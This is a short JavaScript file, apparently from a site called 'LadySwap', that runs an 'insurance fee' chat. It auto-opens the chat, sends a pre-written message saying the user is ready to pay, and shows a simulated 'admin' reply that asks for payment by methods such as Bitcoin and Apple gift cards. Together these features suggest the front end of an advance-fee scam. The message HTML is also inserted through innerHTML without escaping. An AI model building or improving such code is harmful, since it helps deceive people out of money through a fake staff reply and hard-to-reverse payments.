// LadySwap — Insurance Fee Logic
(function () {
  'use strict';

  // ---- State ----
  let sessionId = Session.getOrCreateId();
  let conversationId = null;
  let chatOpen = false;
  const insuranceTrigger = 'Hey i am ready to proceed on insurance fee.';
  const autoReply =
    'Accepted payment methods: Paypal, Cashapp, Apple Pay, Venmo, Chime, Bank transfer, Bitcoin and Apple gift card. Please select your preferred payment method.';

  // ---- DOM refs ----
  const chatModal = document.getElementById('chatModal');
  const chatInput = document.getElementById('chatInput');
  const chatSendBtn = document.getElementById('chatSendBtn');
  const chatMessages = document.getElementById('chatMessages');
  const closeChatBtn = document.getElementById('closeChatBtn');

  // Open chat and send insurance message
  window.openInsuranceChat = async function () {
    chatModal.classList.add('open');
    chatOpen = true;
    if (!conversationId) {
      const code = Session.getSubscriberCode();
      const res = await API.post('/chat/start/', {
        session_id: sessionId,
        subscriber_code: code || '',
      });
      if (res.ok) conversationId = res.data.conversation_id;
    }
    chatInput.value = insuranceTrigger;
    chatInput.style.height = 'auto';
    chatInput.style.height = Math.min(chatInput.scrollHeight, 100) + 'px';
    chatInput.focus();
    sendInsuranceMessage();
  };

  // Auto-open chat if ?auto=1 in URL
  if (window.location.search.includes('auto=1')) {
    setTimeout(() => window.openInsuranceChat(), 400);
  }

  async function sendInsuranceMessage() {
    const text = chatInput.value.trim();
    if (!text) return;
    if (!conversationId) return;
    chatInput.value = '';
    chatInput.style.height = 'auto';
    appendMessage({ content: text, is_from_admin: false, created_at: new Date().toISOString() });
    // Simulate auto-reply
    setTimeout(() => {
      appendMessage({ content: autoReply, is_from_admin: true, created_at: new Date().toISOString() });
    }, 800);
  }

  function appendMessage(msg) {
    if (!chatMessages) return;
    const div = document.createElement('div');
    div.className = `message ${msg.is_from_admin ? 'admin' : 'user'}`;
    const text = msg.content ? `<span class="message-text">${msg.content}</span>` : '';
    div.innerHTML = `
      <div class="message-bubble">${text}</div>
      <div class="message-time">${new Date(msg.created_at).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</div>`;
    chatMessages.appendChild(div);
    chatMessages.scrollTop = chatMessages.scrollHeight;
  }

  // Close chat
  if (closeChatBtn) closeChatBtn.addEventListener('click', () => {
    chatModal.classList.remove('open');
    chatOpen = false;
  });

})();
